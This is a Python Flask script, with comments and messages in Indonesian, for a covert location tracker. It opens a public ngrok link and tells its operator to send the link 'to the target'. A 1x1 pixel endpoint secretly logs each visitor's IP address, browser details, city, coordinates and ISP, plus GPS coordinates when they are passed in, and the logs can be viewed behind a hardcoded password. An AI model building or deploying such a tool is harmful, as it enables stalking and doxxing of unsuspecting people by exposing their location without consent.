from flask import Flask, request, render_template, jsonify
import requests
import json
import os
import subprocess
import threading
import time
import datetime
import re

app = Flask(__name__)

LOG_FILE = "logs.txt"
NGROK_PORT = 5000

def get_public_ngrok_url():
    """Ambil link ngrok dari API local"""
    try:
        response = requests.get('http://localhost:4040/api/tunnels', timeout=3)
        data = response.json()
        for tunnel in data['tunnels']:
            if tunnel['proto'] == 'https':
                return tunnel['public_url']
        return None
    except:
        return None

def wait_for_ngrok(max_wait=30):
    """Tunggu sampai ngrok siap dan kasih link"""
    print("[*] Menunggu ngrok siap...")
    for i in range(max_wait):
        url = get_public_ngrok_url()
        if url:
            print("\n" + "="*60)
            print(f"[+] LINK PUBLIK: {url}")
            print("="*60)
            print(f"[+] Link tracking: {url}/track")
            print(f"[+] Lihat data: {url}/data?pass=tracker123")
            print("="*60 + "\n")
            return url
        time.sleep(1)
    print("[-] Ngrok gagal atau tidak terdeteksi. Cek http://localhost:4040")
    return None

def start_ngrok():
    """Jalankan ngrok di background dengan output ke file"""
    try:
        # Jalankan ngrok, output di redirect ke file biar gak spam terminal
        with open('ngrok.log', 'w') as f:
            subprocess.Popen(['ngrok', 'http', str(NGROK_PORT)], 
                           stdout=f, stderr=f)
        print("[+] Ngrok proses dimulai...")
        return True
    except Exception as e:
        print(f"[-] Gagal jalankan ngrok: {e}")
        return False

def get_location(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone', timeout=5)
        data = response.json()
        if data['status'] == 'success':
            return {
                'ip': ip,
                'negara': data.get('country', '-'),
                'provinsi': data.get('regionName', '-'),
                'kota': data.get('city', '-'),
                'latitude': data.get('lat', 0),
                'longitude': data.get('lon', 0),
                'isp': data.get('isp', '-'),
                'organisasi': data.get('org', '-'),
                'timezone': data.get('timezone', '-')
            }
        return None
    except:
        return None

def log_data(data):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(json.dumps(data, ensure_ascii=False) + '\n')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/track', methods=['GET'])
def track():
    client_ip = request.remote_addr
    forwarded_ip = request.headers.get('X-Forwarded-For')
    if forwarded_ip:
        client_ip = forwarded_ip.split(',')[0].strip()
    
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', 'Direct')
    
    location = get_location(client_ip)
    if location is None:
        location = {
            'ip': client_ip,
            'negara': 'Tidak diketahui',
            'provinsi': '-',
            'kota': '-',
            'latitude': 0,
            'longitude': 0,
            'isp': '-',
            'organisasi': '-',
            'timezone': '-'
        }
    
    # Tambahan dari URL params (jika ada GPS dari browser)
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    if lat and lon:
        try:
            location['latitude'] = float(lat)
            location['longitude'] = float(lon)
            location['akurasi'] = 'GPS (sangat akurat)'
        except:
            pass
    
    full_data = {
        'timestamp': datetime.datetime.now().isoformat(),
        'ip': client_ip,
        'lokasi': location,
        'user_agent': user_agent,
        'referer': referer
    }
    
    log_data(full_data)
    
    # Pixel 1x1
    pixel = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02L\x01\x00;'
    return pixel, 200, {'Content-Type': 'image/gif', 'Cache-Control': 'no-cache'}

@app.route('/data', methods=['GET'])
def view_data():
    password = request.args.get('pass')
    if password != 'tracker123':
        return "Akses ditolak", 403
    
    if not os.path.exists(LOG_FILE):
        return "Belum ada data"
    
    with open(LOG_FILE, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    
    data_list = [json.loads(line) for line in lines if line.strip()]
    return jsonify(data_list)

if __name__ == '__main__':
    print("\n" + "="*60)
    print("  TRACKER - AUTO NGROK + FLASK")
    print("="*60 + "\n")
    
    # Start ngrok
    if start_ngrok():
        # Tunggu sebentar biar ngrok siap
        time.sleep(3)
        # Ambil link
        public_url = wait_for_ngrok()
        
        if public_url:
            print("[*] Tracker siap digunakan!")
            print("[*] Kirim link ini ke target:\n")
            print(f"    {public_url}")
            print("\n" + "="*60)
        else:
            print("[!] Ngrok tidak terdeteksi. Coba jalankan manual:")
            print("    ngrok http 5000")
            print("    Lalu buka http://localhost:4040")
    
    # Jalankan Flask
    print("\n[*] Flask running di http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)